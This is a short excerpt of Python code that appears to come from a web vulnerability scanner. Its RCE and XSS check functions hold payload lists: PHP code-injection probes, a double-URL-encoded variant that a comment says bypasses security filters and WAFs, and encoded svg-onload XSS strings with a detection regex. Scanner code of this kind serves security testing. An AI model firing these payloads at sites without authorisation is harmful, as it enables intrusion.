...
def rce_func(url):
	headers_reader(url)
  	...
  	payloads = [';${@print(md5(Naveen))}', ';${@print(md5("Naveen"))}']
  	# Below is the Encrypted Payloads to bypass some Security Filters & WAF's
  	payloads += ['%253B%2524%257B%2540print%2528md5%2528%2522Naveen%2522%2529%2529%257D%253B']
...
def xss_func(url):
        ...
        payloads = ['%27%3ENaveen%3Csvg%2Fonload%3Dconfirm%28%2FNaveen%2F%29%3Eweb', '%78%22%78%3e%78']
        payloads += ['%22%3ENaveen%3Csvg%2Fonload%3Dconfirm%28%2FNaveen%2F%29%3Eweb', 'Naveen%3Csvg%2Fonload%3Dconfirm%28%2FNaveen%2F%29%3Eweb']
        check = re.compile('Naveen<svg|x>x', re.I)
        main_function(url, payloads, check)
